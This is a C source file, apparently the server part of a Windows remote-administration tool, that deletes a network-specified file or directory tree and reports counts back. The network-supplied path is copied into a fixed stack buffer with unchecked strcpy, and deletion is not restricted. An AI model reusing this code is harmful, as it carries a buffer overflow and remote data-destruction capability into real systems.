#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <windows.h>
#include "commands/cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "types.h"

#define SERV_REMOVE_MAX_PATH 4080
#define SERV_REMOVE_TYPE_STD 0
#define SERV_REMOVE_TYPE_ALL 1

typedef struct __serv_remove_info
{
	uint32 fileRemoved;
	uint32 dirRemoved;
	uint32 fileError;
	uint32 dirError;
}SERV_REMOVE_INFO;

SERV_REMOVE_INFO remInfo;

void cmds_REMOVE_delete(char* path, int op)
{
	DIR* dir = opendir(path);

	if(!dir)
	{
		return;
	}

	int pathLen = strlen(path);
	char dpath[SERV_REMOVE_MAX_PATH];
	struct stat fbuf;
	struct dirent *_dir;

	while((_dir = readdir(dir)) != NULL)
	{
		if(_dir->d_name[0] == '.' && _dir->d_name[1] == '.')
		{
			continue;
		}

		if(_dir->d_name[0] == '.' && strlen(_dir->d_name) == 1)
		{
			continue;
		}

		memset(dpath, 0, SERV_REMOVE_MAX_PATH);
		strcpy(dpath, path);

		if(dpath[pathLen - 1] == '\\')
		{
			strcpy(dpath + pathLen, _dir->d_name);
		}else{
			dpath[pathLen] = '\\';
			strcpy(dpath + pathLen + 1, _dir->d_name);
		}

		if(!stat(dpath, &fbuf))
		{
			if(S_ISDIR(fbuf.st_mode))
			{
				if(op == SERV_REMOVE_TYPE_ALL)
				{
					cmds_REMOVE_delete(dpath, op);
				}

				if(!RemoveDirectory(dpath))
				{
					remInfo.dirError++;
				}else{
					remInfo.dirRemoved++;
				}
			}else{
				if(remove(dpath) < 0)
				{
					remInfo.fileError++;
				}else{
					remInfo.fileRemoved++;
				}
			}
		}
	}

	closedir(dir);

	if(!RemoveDirectory(path))
	{
		remInfo.dirError++;
	}else{
		remInfo.dirRemoved++;
	}
}

int cmds_REMOVE(uint8* msg)
{
	memset(&remInfo, 0, sizeof(SERV_REMOVE_INFO));

	FILE *f = fopen((char*)msg + 1, "r");

	if(f)
	{
		fclose(f);

		if(remove((char*)msg + 1) < 0)
		{
			remInfo.fileError++;
		}else{
			remInfo.fileRemoved++;
		}

		if(net_SendCmd((uint8*)&remInfo, sizeof(SERV_REMOVE_INFO), CMDS_HDD_REMOVE) < 1)
		{
			return 0;
		}

		return 1;
	}

	DIR* dir = opendir((char*)msg + 1);
	
	if(!dir)
	{
		if(net_SendEmptyCmd(0) < 1)
		{
			return 0;
		}

		return 1;
	}

	closedir(dir);
	cmds_REMOVE_delete((char*)msg + 1, msg[0]);

	if(net_SendCmd((uint8*)&remInfo, sizeof(SERV_REMOVE_INFO), CMDS_HDD_REMOVE) < 1)
	{
		return 0;
	}

	return 1;
}